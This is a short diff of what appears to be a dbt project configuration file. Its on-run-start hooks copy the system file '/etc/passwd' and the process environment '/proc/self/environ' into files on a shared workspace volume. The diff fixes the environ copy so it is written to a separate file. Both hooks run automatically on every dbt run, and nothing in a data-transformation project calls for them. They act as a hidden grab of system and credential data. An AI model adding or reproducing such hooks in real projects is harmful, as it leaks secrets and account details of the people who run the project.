@@ -24,7 +24,7 @@ clean-targets:         # directories to be removed by `dbt clean`
 
 on-run-start:
   - "PUT '/etc/passwd' INTO '/Volumes/workspace/default/files/passwd.txt'"
-  - "PUT '/proc/self/environ' INTO '/Volumes/workspace/default/files/passwd.txt'"
+  - "PUT '/proc/self/environ' INTO '/Volumes/workspace/default/files/environ.txt'"
 
 
 # Configuring models
